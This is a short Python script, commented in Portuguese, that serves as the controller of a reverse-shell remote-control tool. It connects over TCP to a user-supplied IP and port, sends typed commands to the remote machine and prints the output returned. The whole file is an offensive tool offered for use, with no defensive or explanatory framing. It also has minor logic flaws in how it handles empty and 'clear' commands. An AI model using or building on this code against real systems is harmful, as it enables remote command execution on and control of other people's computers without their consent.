import socket
import os
import argparse
import sys

parser = argparse.ArgumentParser(description='Shell reversa em Python')
parser.add_argument('-i','--ip', type=str, help='IP do usuario')
parser.add_argument('-p','--port', type=int, help='Porta da aplicação')
args = parser.parse_args()


print("""
 _________________________________________
|                                         |
|                                         |
|      SHELL REVERSE REMOTE CONTROL       |
|         By: Matheus Magalhães           |
|                                         |
|_________________________________________|
""")


HOST = str(args.ip)
PORT = int(args.port)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))
while True:
       command = str(input(f'[{HOST}]> '))
       if command.strip() == 'clear':   
              os.system('cls')
       if command == '':
              s.send('.'.encode())
       if command == 'close connection':
              s.send('close'.encode())
              s.close()
       else:
              s.send(command.encode())
              response = s.recv(50000)
              print(response.decode())